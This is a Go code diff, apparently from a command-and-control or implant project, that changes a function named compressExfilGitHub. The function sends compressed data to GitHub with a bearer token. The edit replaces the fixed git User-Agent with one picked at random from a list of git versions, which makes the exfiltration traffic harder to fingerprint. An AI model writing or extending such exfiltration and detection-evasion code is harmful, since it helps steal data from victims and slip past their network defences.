@@ -2,6 +2,7 @@ package commands
 
 import (
 	"bytes"
+	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
@@ -321,7 +322,10 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 	req.Header.Set("Authorization", "Bearer "+gh.Token)
 	req.Header.Set("Accept", "application/vnd.github+json")
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "git/2.45.0")
+	gitUAs := []string{"git/2.43.0", "git/2.44.1", "git/2.45.0", "git/2.45.2", "git/2.46.0"}
+	var b [1]byte
+	rand.Read(b[:])
+	req.Header.Set("User-Agent", gitUAs[int(b[0])%len(gitUAs)])
 
 	client := &http.Client{Timeout: 5 * time.Minute}
 	resp, err := client.Do(req)
